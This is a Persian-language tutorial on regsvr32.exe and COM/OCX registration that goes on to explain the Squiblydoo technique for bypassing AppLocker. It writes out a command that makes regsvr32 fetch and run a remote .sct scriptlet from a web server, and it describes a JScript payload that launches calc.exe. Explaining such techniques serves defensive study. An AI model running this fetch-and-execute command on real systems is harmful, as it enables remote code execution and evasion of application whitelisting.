این پروسه یکی از پروسه های سیستمی ماکروسافت است که برای Registry و Unregistry کردن dll ها OCX ها است 

اما دقیق تر بخواهیم این موضوع رو برسی کنیم خب ما یه پروسه یی داریم که این پروسه ما از یه سری  libriary های خاص استفاده میکند، حالا اگر بخواهیم که این libriray ها رو به نوعی در سیستم عامل ویندوز به عنوان یک component ثبت کنیم پروسه regsvr32.exe این کارو برای ما انجام میدهد 

## این پروسه چه کاری انجام می‌دهد؟
وقتی یک فایل DLL یا OCX (مثل کنترل‌های COM) را با regsvr32.exe ثبت می‌کنید، اطلاعات لازم (مثل CLSID، مسیر فایل، توابع قابل دسترسی و ...) در رجیستری ویندوز ذخیره می‌شود تا:
- برنامه‌های دیگر بتوانند از آن کامپوننت استفاده کنند.
- سیستم بداند که این کامپوننت کجاست و چطور باید آن را فراخوانی کند.

---

## **اما فایل های OCX برای چی هستند ؟**
ما یک فناوری قدیمی اما زنده در سیستم عامل ویندوز داریم که این فرایند این امکان را برای ما فراهم میکند تا بتوانیم کامپوننت های نرم افزاری  درست کنیم تا به واسطه این کامپوننت ها نرم افزار های مختلف بتوانند باهم تعامل داشته باشند

حالا در مبحث امنیت تهاجمی ما یک تکنیکی داریم به اسم Squiblydoo که یک **تکنیک حمله شناخته‌شده** است که توسط مهاجمان برای **اجرای کد از راه دور (Remote Code Execution)** بدون نیاز به دسترسی ادمین و **بدون نیاز به نوشتن فایل روی دیسک** استفاده می‌شود.

در این تکنیک، از قابلیت regsvr32 برای **لود کردن یک فایل script (معمولاً .sct یا .xml)** از طریق **HTTP یا HTTPS** استفاده می‌شود — یعنی مهاجم می‌تواند یک اسکریپت را از اینترنت بارگذاری کند و اجرا کند.

یکی از دلایلی که مهاجمان  از این تکنیک برای انجام فراینده Execution انجام میدهند میشه گفت Bypass کردن Applocker  هست

---

🔹 **Bypass Application Whitelisting یعنی چی؟**  
برخی سازمان‌ها از سیاست‌های امنیتی مثل **AppLocker** یا **Windows Defender Application Control** استفاده می‌کنند تا فقط برنامه‌های خاصی بتوانند اجرا شوند.  
اما چون `regsvr32.exe` یک فایل قانونی و سیستمی است (در مسیر `C:\Windows\System32`)، این سیاست‌ها معمولاً اجازه اجرای آن را می‌دهند.  
در نتیجه مهاجم می‌تواند با استفاده از regsvr32، کد خودش را غیرمستقیم اجرا کند — یعنی **اجرای کد مخرب بدون نیاز به اجرای مستقیم فایل غیرمجاز.**

---

اما ما صحبت از  RCE کردیم ولی قرار نیست که یک Agent یا یک Dropper روی سیستم هدف باشد تا به واسطه این Dropper بیایم و از طریق regsvr32.exe بیایم  و malware اصلیمون رو از اینترنت دانلود و اجرا کنیم 
اما چطور اینکار انجام میشود، ما برای اینکه این فرایند رو انجام بدهمیم احتیاج داریم به یک اسکریپتی که این اسکریپت بیاد برای ما این فرایند رو انجام بدهد یعنی پروسه regsvr32.exe فراخوانی کند و از این طریق payload اصلی مارو از اینترنت دانلود کند

فایل‌هایی با پسوند **`.sct`** در واقع **فایل‌های Scriptlet** هستند و معمولاً برای **اجرای کدهای اسکریپتی در ویندوز** استفاده می‌شن. بیای قدم‌به‌قدم برات بازش کنم 👇

«اجرایی  
آدرس: `http://10.0.0.5/back.sct`

محتوای فایل `back.sct` یک **scriptlet** به فرمت XML است. در بخش `<registration>` مشخصات COM (progid و classid) تعیین شده و داخل تگ `<script language="JScript">` یک قطعه کد JScript قرار دارد که با `ActiveXObject("WScript.Shell")` شیء شل ویندوز را می‌سازد و دستور `Run("calc.exe")` را اجرا می‌کند (در اینجا `calc.exe` اجرا می‌شود).  
پیغام آخر می‌گوید: «باید فایل back.sct را روی یک وب‌سرور میزبانی کنیم تا بتوانیم آن را فراخوانی کنیم.»»

```
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```

# چی هست scrobj.dll؟

`scrobj.dll` = **Windows Script Component Runtime**
(کامپوننت اجرای اسکریپت ویندوز).  
به طور فنی این DLL نقش «runtime / in-proc COM server» برای **Script Components** داره: یعنی واسطه‌ایه که درخواست‌های COM رو به اسکریپت‌ها (JScript/VBScript) پاس‌کاری (dispatch) می‌کنه و اجازه می‌ده اسکریپت‌ها از طریق COM فراخوانی و اجرا بشن.
